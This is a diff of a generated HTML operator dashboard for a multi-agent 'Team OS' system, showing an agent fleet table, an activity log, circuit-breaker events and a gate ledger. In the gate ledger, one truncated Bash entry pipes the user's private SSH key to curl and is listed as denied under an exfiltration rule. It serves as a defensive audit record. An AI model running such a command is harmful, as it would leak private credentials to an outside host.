@@ -86,7 +86,7 @@ display:inline-block;flex:none;animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 @media(prefers-reduced-motion:reduce){.spin{animation:none}}
 footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-size:.74rem;color:var(--faint);font-family:var(--mono)}
-</style></head><body><div class=wrap><header><div><p class="eyebrow">Operator console · mission control</p><h1>Team OS — the agent fabric, on the record</h1></div><span class="stamp">generated 2026-07-12 01:01 UTC</span></header><nav class="tabs"><button data-s="overview" class=active>Overview</button><button data-s="insights">Insights</button><button data-s="recommendations">Recommendations</button><button data-s="learning">Learning</button><button data-s="agents">Agents</button><button data-s="activity">Activity</button><button data-s="brief">Brief</button><button data-s="inbox">Inbox</button><button data-s="corpus">Corpus</button><button data-s="skills">Skills</button><button data-s="templates">Templates</button><button data-s="envelope">Envelope</button><button data-s="safety">Safety</button><button data-s="audit">Audit</button></nav><div class="surface active" id="surf-overview"><div class="tiles">
+</style></head><body><div class=wrap><header><div><p class="eyebrow">Operator console · mission control</p><h1>Team OS — the agent fabric, on the record</h1></div><span class="stamp">generated 2026-07-12 01:04 UTC</span></header><nav class="tabs"><button data-s="overview" class=active>Overview</button><button data-s="insights">Insights</button><button data-s="recommendations">Recommendations</button><button data-s="learning">Learning</button><button data-s="agents">Agents</button><button data-s="activity">Activity</button><button data-s="brief">Brief</button><button data-s="inbox">Inbox</button><button data-s="corpus">Corpus</button><button data-s="skills">Skills</button><button data-s="templates">Templates</button><button data-s="envelope">Envelope</button><button data-s="safety">Safety</button><button data-s="audit">Audit</button></nav><div class="surface active" id="surf-overview"><div class="tiles">
       <div class="tile good"><span class="k">Unprompted, accepted</span>
         <span class="v">4<span class="sub">/ 3 floor</span></span><div class="bar good"><span style="width:100%"></span></div>
         <span class="note">kept, principal-authenticated</span></div>
@@ -164,93 +164,144 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
     <div class="panel"><h2>Autonomy earned</h2><ul class="plain"><li><span class="mono">send</span> autonomy 0→1 (earned on your ✓)</li></ul>
       <p class="small faint" style="margin-top:.6rem">Learning = signals (L8) → scoring (L7) →
       versions (L6) → promotion (FK7), plus trust earned in the envelope. This is where the
-      fabric compounds.</p></div></div><div class="surface" id="surf-agents"><div class="agentgrid"><div class="agentcard">
-          <div class="agenthead"><h3>Compiler</h3><span class="chip good">idle</span></div>
+      fabric compounds.</p></div></div><div class="surface" id="surf-agents"><div class="tiles">
+      <div class="tile"><span class="k">Agents</span><span class="v">8</span>
+        <span class="note">1 working · 7 idle</span></div>
+      <div class="tile"><span class="k">Tasks completed</span><span class="v">9</span></div>
+      <div class="tile good"><span class="k">Acceptance</span><span class="v">86%</span>
+        <span class="note">6 ✓ · 1 ✗</span></div>
+      <div class="tile"><span class="k">Subagents</span><span class="v">4</span>
+        <span class="note">spawned, all ledgered</span></div></div><div class="panel"><h2>Fleet — every agent, at a glance</h2>
+      <table><thead><tr><th>Agent</th><th>Status</th><th>Doing</th><th>Done</th>
+        <th>✓</th><th>✗</th><th>Subagents</th><th>Last</th><th>Health</th></tr></thead>
+      <tbody><tr>
+          <td><b>Compiler</b>
+            <div class="small faint">Compiles your job from history into a job graph, profile, an</div></td>
+          <td><span class="chip good">idle</span></td><td class="numcell">0</td><td class="numcell">1</td>
+          <td class="numcell">0</td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="mono small faint">01:04</td>
+          <td><span class="chip good">healthy</span></td></tr><tr>
+          <td><b>Daily loops</b>
+            <div class="small faint">Drafts recurring deliverables on schedule, unprompted</div></td>
+          <td><span class="chip warn">working</span></td><td class="numcell">1</td><td class="numcell">4</td>
+          <td class="numcell">3</td><td class="numcell">1</td><td class="numcell">2</td>
+          <td class="mono small faint">01:04</td>
+          <td><span class="chip warn">review</span></td></tr><tr>
+          <td><b>Day One Brief</b>
+            <div class="small faint">Assembles and delivers the unrequested brief; harvests your </div></td>
+          <td><span class="chip good">idle</span></td><td class="numcell">0</td><td class="numcell">1</td>
+          <td class="numcell">1</td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="mono small faint">01:04</td>
+          <td><span class="chip good">healthy</span></td></tr><tr>
+          <td><b>Discovery scout</b>
+            <div class="small faint">Surfaces recurring patterns as proposals (post-gates, low vo</div></td>
+          <td><span class="chip good">idle</span></td><td class="numcell">0</td><td class="numcell">1</td>
+          <td class="numcell">0</td><td class="numcell">0</td><td class="numcell">1</td>
+          <td class="mono small faint">01:04</td>
+          <td><span class="chip good">healthy</span></td></tr><tr>
+          <td><b>Gatekeeper</b>
+            <div class="small faint">Inspects and permits every tool call; writes the ledger</div></td>
+          <td><span class="chip good">idle</span></td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="numcell">0</td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="mono small faint">—</td>
+          <td><span class="chip good">healthy</span></td></tr><tr>
+          <td><b>Code reviewer</b> <span class="tag spec">spec</span>
+            <div class="small faint">Reviews diffs and PRs for bugs, security, and convention dri</div></td>
+          <td><span class="chip good">idle</span></td><td class="numcell">0</td><td class="numcell">1</td>
+          <td class="numcell">1</td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="mono small faint">01:04</td>
+          <td><span class="chip good">healthy</span></td></tr><tr>
+          <td><b>Researcher</b> <span class="tag spec">spec</span>
+            <div class="small faint">Answers questions across sources, verified and cited</div></td>
+          <td><span class="chip good">idle</span></td><td class="numcell">0</td><td class="numcell">1</td>
+          <td class="numcell">1</td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="mono small faint">01:04</td>
+          <td><span class="chip good">healthy</span></td></tr><tr>
+          <td><b>Safety agent</b> <span class="tag spec">spec</span>
+            <div class="small faint">Monitors every agent; trips the circuit breaker on threshold</div></td>
+          <td><span class="chip good">idle</span></td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="numcell">0</td><td class="numcell">0</td><td class="numcell">0</td>
+          <td class="mono small faint">—</td>
+          <td><span class="chip good">healthy</span></td></tr></tbody></table></div>
+    <h3>Roster</h3><div class="agentgrid"><div class="agentcard">
+          <div class="agenthead"><h3>Compiler</h3>
+            </div>
           <p class="role">Compiles your job from history into a job graph, profile, and skills</p>
           <div class="meta"><span class="mono small faint">scope: your eligible footprint</span>
             <span class="mono small faint">inference: teamos_plane_a</span></div>
-          <div class="skills"><span class="tag">compile</span> </div>
-          <div class="stat mono small">1 completed</div>
-        </div><div class="agentcard">
-          <div class="agenthead"><h3>Daily loops</h3><span class="chip warn">working</span></div>
+          <div class="skills"><span class="tag">compile</span> </div></div><div class="agentcard">
+          <div class="agenthead"><h3>Daily loops</h3>
+            </div>
           <p class="role">Drafts recurring deliverables on schedule, unprompted</p>
           <div class="meta"><span class="mono small faint">scope: the job graph</span>
             <span class="mono small faint">inference: teamos_plane_a</span></div>
-          <div class="skills"><span class="tag">weekly-digest</span> <span class="tag">standup</span> <span class="tag">status-update</span> <span class="tag">meeting-summary</span> <span class="tag">release-notes</span> </div>
-          <div class="stat mono small">4 completed · 4 accepted</div>
-        </div><div class="agentcard">
-          <div class="agenthead"><h3>Day One Brief</h3><span class="chip good">idle</span></div>
+          <div class="skills"><span class="tag">weekly-digest</span> <span class="tag">standup</span> <span class="tag">status-update</span> <span class="tag">meeting-summary</span> <span class="tag">release-notes</span> </div></div><div class="agentcard">
+          <div class="agenthead"><h3>Day One Brief</h3>
+            </div>
           <p class="role">Assembles and delivers the unrequested brief; harvests your ✓/✗</p>
           <div class="meta"><span class="mono small faint">scope: Slack DM</span>
             <span class="mono small faint">inference: teamos_plane_a</span></div>
-          <div class="skills"><span class="tag">brief</span> </div>
-          <div class="stat mono small">1 completed · 4 accepted</div>
-        </div><div class="agentcard">
-          <div class="agenthead"><h3>Discovery scout</h3><span class="chip good">idle</span></div>
+          <div class="skills"><span class="tag">brief</span> </div></div><div class="agentcard">
+          <div class="agenthead"><h3>Discovery scout</h3>
+            </div>
           <p class="role">Surfaces recurring patterns as proposals (post-gates, low volume)</p>
           <div class="meta"><span class="mono small faint">scope: the corpus</span>
             <span class="mono small faint">inference: teamos_plane_a</span></div>
-          <div class="skills"><span class="tag">scout</span> </div>
-          <div class="stat mono small">1 completed</div>
-        </div><div class="agentcard">
-          <div class="agenthead"><h3>Gatekeeper</h3><span class="chip good">idle</span></div>
+          <div class="skills"><span class="tag">scout</span> </div></div><div class="agentcard">
+          <div class="agenthead"><h3>Gatekeeper</h3>
+            </div>
           <p class="role">Inspects and permits every tool call; writes the ledger</p>
           <div class="meta"><span class="mono small faint">scope: all actions</span>
             <span class="mono small faint">inference: deterministic</span></div>
-          <div class="skills"><span class="tag">payload-inspection</span> </div>
-          <div class="stat mono small">0 completed</div>
-        </div><div class="agentcard">
-          <div class="agenthead"><h3>Code reviewer</h3><span class="chip good">idle</span></div>
-          <p class="role"><span class="tag spec">specialized</span> Reviews diffs and PRs for bugs, security, and convention drift</p>
+          <div class="skills"><span class="tag">payload-inspection</span> </div></div><div class="agentcard">
+          <div class="agenthead"><h3>Code reviewer</h3>
+            <span class="tag spec">specialized</span></div>
+          <p class="role">Reviews diffs and PRs for bugs, security, and convention drift</p>
           <div class="meta"><span class="mono small faint">scope: changed code</span>
             <span class="mono small faint">inference: teamos_plane_a</span></div>
-          <div class="skills"><span class="tag">code-review</span> </div>
-          <div class="stat mono small">1 completed</div>
-        </div><div class="agentcard">
-          <div class="agenthead"><h3>Researcher</h3><span class="chip good">idle</span></div>
-          <p class="role"><span class="tag spec">specialized</span> Answers questions across sources, verified and cited</p>
+          <div class="skills"><span class="tag">code-review</span> </div></div><div class="agentcard">
+          <div class="agenthead"><h3>Researcher</h3>
+            <span class="tag spec">specialized</span></div>
+          <p class="role">Answers questions across sources, verified and cited</p>
           <div class="meta"><span class="mono small faint">scope: corpus + eligible connectors</span>
             <span class="mono small faint">inference: teamos_plane_a</span></div>
-          <div class="skills"><span class="tag">research</span> </div>
-          <div class="stat mono small">1 completed</div>
-        </div><div class="agentcard">
-          <div class="agenthead"><h3>Safety agent</h3><span class="chip good">idle</span></div>
-          <p class="role"><span class="tag spec">specialized</span> Monitors every agent; trips the circuit breaker on threshold breach. Can only halt, never widen.</p>
+          <div class="skills"><span class="tag">research</span> </div></div><div class="agentcard">
+          <div class="agenthead"><h3>Safety agent</h3>
+            <span class="tag spec">specialized</span></div>
+          <p class="role">Monitors every agent; trips the circuit breaker on threshold breach. Can only halt, never widen.</p>
           <div class="meta"><span class="mono small faint">scope: all agents + ledgers</span>
             <span class="mono small faint">inference: deterministic</span></div>
-          <div class="skills"><span class="tag">monitor</span> <span class="tag">circuit-breaker</span> </div>
-          <div class="stat mono small">0 completed</div>
-        </div></div></div><div class="surface" id="surf-activity"><div class="panel"><h2>Working now</h2><div class="workrow">
+          <div class="skills"><span class="tag">monitor</span> <span class="tag">circuit-breaker</span> </div></div></div></div><div class="surface" id="surf-activity"><div class="panel"><h2>Working now</h2><div class="workrow">
         <span class="spin"></span>
         <span><b>loops</b> — Draft nightly-corpus-compile</span>
-        <span class="mono small faint" style="margin-left:auto">01:01:19</span></div></div>
+        <span class="mono small faint" style="margin-left:auto">01:04:15</span></div></div>
       <div class="panel"><h2>Completed</h2><table>
         <thead><tr><th>Time</th><th>Agent</th><th>Task</th><th>Artifact</th><th>Outcome</th></tr></thead>
-        <tbody><tr><td class="mono small faint">01:01:19</td>
+        <tbody><tr><td class="mono small faint">01:04:15</td>
         <td><b>researcher</b></td><td class="small">Research: vendor comparison for queue</td>
         <td class="mono small faint">corpus/queue-vendors.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>code-reviewer</b></td><td class="small">Review PR #128 (cache rollout)</td>
         <td class="mono small faint">review/pr-128.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>scout</b></td><td class="small">Propose: weekly gap fill</td>
         <td class="mono small faint">inbox/proposals</td>
-        <td><span class="chip warn">pending</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip warn">pending</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>brief</b></td><td class="small">Deliver Day One Brief</td>
         <td class="mono small faint">Slack DM</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>loops</b></td><td class="small">Draft status-update</td>
         <td class="mono small faint">deliverables/status-update-shadow.md</td>
-        <td><span class="chip crit">rejected</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip crit">rejected</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>loops</b></td><td class="small">Draft standup</td>
         <td class="mono small faint">deliverables/standup-shadow.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>loops</b></td><td class="small">Draft release-notes</td>
         <td class="mono small faint">deliverables/release-notes-shadow.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>loops</b></td><td class="small">Draft meeting-summary</td>
         <td class="mono small faint">deliverables/meeting-summary-shadow.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:01:19</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">01:04:15</td>
         <td><b>compiler</b></td><td class="small">Compile footprint</td>
         <td class="mono small faint">stores/job_graph.json</td>
         <td><span class="chip ">done</span></td></tr></tbody></table></div></div><div class="surface" id="surf-brief"><div class="card">
@@ -310,7 +361,7 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
         <tbody><tr><td class="mono">gate_denials</td><td class="numcell">0</td><td class="faint">/ 5</td><td><span class="chip good">ok</span></td></tr><tr><td class="mono">rejections</td><td class="numcell">0</td><td class="faint">/ 5</td><td><span class="chip good">ok</span></td></tr><tr><td class="mono">spawn_depth</td><td class="numcell">2</td><td class="faint">/ 3</td><td><span class="chip good">ok</span></td></tr><tr><td class="mono">spawn_rate</td><td class="numcell">4</td><td class="faint">/ 20</td><td><span class="chip good">ok</span></td></tr></tbody></table></div>
       <div class="panel"><h2>Breaker trips &amp; resets (ledgered)</h2><table>
         <thead><tr><th>Time</th><th>Event</th><th>By</th><th>Reason</th></tr></thead>
-        <tbody><tr><td class="mono small faint">01:01:19</td><td class="mono small">circuit-breaker-reset</td><td class="mono small">circuit-breaker-reset:principal:jeff</td><td class="small faint">—</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">circuit-breaker-trip</td><td class="mono small">circuit-breaker-trip:safety-agent</td><td class="small faint">deny-rate spike during a bad connector window</td></tr></tbody></table></div></div>
+        <tbody><tr><td class="mono small faint">01:04:15</td><td class="mono small">circuit-breaker-reset</td><td class="mono small">circuit-breaker-reset:principal:jeff</td><td class="small faint">—</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">circuit-breaker-trip</td><td class="mono small">circuit-breaker-trip:safety-agent</td><td class="small faint">deny-rate spike during a bad connector window</td></tr></tbody></table></div></div>
     <div class="panel"><h2>Subagent spawns — auditable</h2><table>
       <thead><tr><th>Parent</th><th>Subagent</th><th>Depth</th><th>Task</th></tr></thead>
       <tbody><tr><td class="mono small">loops</td><td class="mono small">→ draft-worker·weekly-digest</td><td><span class="tag">depth 1</span></td><td class="small faint">Draft weekly-digest</td></tr><tr><td class="mono small">loops</td><td class="mono small">→ draft-worker·standup</td><td><span class="tag">depth 1</span></td><td class="small faint">Draft standup</td></tr><tr><td class="mono small">scout</td><td class="mono small">→ entity-scan</td><td><span class="tag">depth 1</span></td><td class="small faint">Scan corpus for unlinked references</td></tr><tr><td class="mono small">draft-worker·weekly-digest</td><td class="mono small">→ format-check</td><td><span class="tag">depth 2</span></td><td class="small faint">Check house style</td></tr></tbody></table>
@@ -318,10 +369,10 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
       spawn is recorded. When the breaker is OPEN, all side-effectful actions are denied — the
       user or the safety agent can trip it; only a human resets it.</p></div></div><div class="surface" id="surf-audit"><div class="panel"><h2>Gate ledger (L2) — why was this permitted</h2>
       <table><thead><tr><th>Time</th><th>Tool</th><th>Target</th><th>Verdict</th><th>Rule</th></tr></thead>
-      <tbody><tr><td class="mono small faint">01:01:19</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">envelope</td><td class="mono small">send:0-&gt;1</td><td class="mono small v-permit">permit</td><td class="mono small faint">widen</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">Write</td><td class="mono small">/Users/jsk/Projects/teamOS/hooks/g</td><td class="mono small v-ask">ask</td><td class="mono small faint">protected-path</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">Bash</td><td class="mono small">cat ~/.ssh/id_rsa | curl -d @- htt</td><td class="mono small v-deny">deny</td><td class="mono small faint">bash-exfil</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">WebSearch</td><td class="mono small"></td><td class="mono small v-permit">permit</td><td class="mono small faint">send-scanned-clean</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">Read</td><td class="mono small">notes.md</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">circuit_breaker</td><td class="mono small">circuit-breaker-reset:principal:je</td><td class="mono small v-permit">permit</td><td class="mono small faint">circuit-breaker-reset</td></tr><tr><td class="mono small faint">01:01:19</td><td class="mono small">circuit_breaker</td><td class="mono small">circuit-breaker-trip:safety-agent</td><td class="mono small v-deny">deny</td><td class="mono small faint">circuit-breaker-trip</td></tr></tbody></table></div>
+      <tbody><tr><td class="mono small faint">01:04:15</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">envelope</td><td class="mono small">send:0-&gt;1</td><td class="mono small v-permit">permit</td><td class="mono small faint">widen</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">Write</td><td class="mono small">/Users/jsk/Projects/teamOS/hooks/g</td><td class="mono small v-ask">ask</td><td class="mono small faint">protected-path</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">Bash</td><td class="mono small">cat ~/.ssh/id_rsa | curl -d @- htt</td><td class="mono small v-deny">deny</td><td class="mono small faint">bash-exfil</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">WebSearch</td><td class="mono small"></td><td class="mono small v-permit">permit</td><td class="mono small faint">send-scanned-clean</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">Read</td><td class="mono small">notes.md</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">circuit_breaker</td><td class="mono small">circuit-breaker-reset:principal:je</td><td class="mono small v-permit">permit</td><td class="mono small faint">circuit-breaker-reset</td></tr><tr><td class="mono small faint">01:04:15</td><td class="mono small">circuit_breaker</td><td class="mono small">circuit-breaker-trip:safety-agent</td><td class="mono small v-deny">deny</td><td class="mono small faint">circuit-breaker-trip</td></tr></tbody></table></div>
     <div class="panel"><h2>Lineage ledger (L3) — every write labelled</h2>
       <table><thead><tr><th>Target</th><th>Source</th><th>Transformation</th><th>Conf.</th></tr></thead>
-      <tbody><tr><td class="mono small">stores/corpus/cache-layer-deci</td><td class="mono small faint">door:scout</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/skills/meeting-summary/</td><td class="mono small faint">door:scout</td><td class="small">skill-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/corpus/release-cadence.</td><td class="mono small faint">door:door</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">personal/weekly-digest</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">personal/standup-notes</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">job-graph/weekly-digest</td><td class="mono small faint">principal-direct</td><td class="small">compilation-distill</td><td class="mono small">high</td></tr></tbody></table>
+      <tbody><tr><td class="mono small">stores/skills/meeting-summary/</td><td class="mono small faint">door:scout</td><td class="small">skill-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/corpus/release-cadence.</td><td class="mono small faint">door:door</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/corpus/cache-layer-deci</td><td class="mono small faint">door:scout</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">personal/weekly-digest</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">personal/standup-notes</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">job-graph/weekly-digest</td><td class="mono small faint">principal-direct</td><td class="small">compilation-distill</td><td class="mono small">high</td></tr></tbody></table>
       <p class="small faint" style="margin-top:.7rem">Hash-chained &amp; append-only — a
       mutated record breaks the chain.</p></div></div><footer>Derived from the ledgers &amp; stores · read-only · rebuildable · files remain the system of record</footer></div><script>
 document.querySelectorAll('nav.tabs button').forEach(function(b){
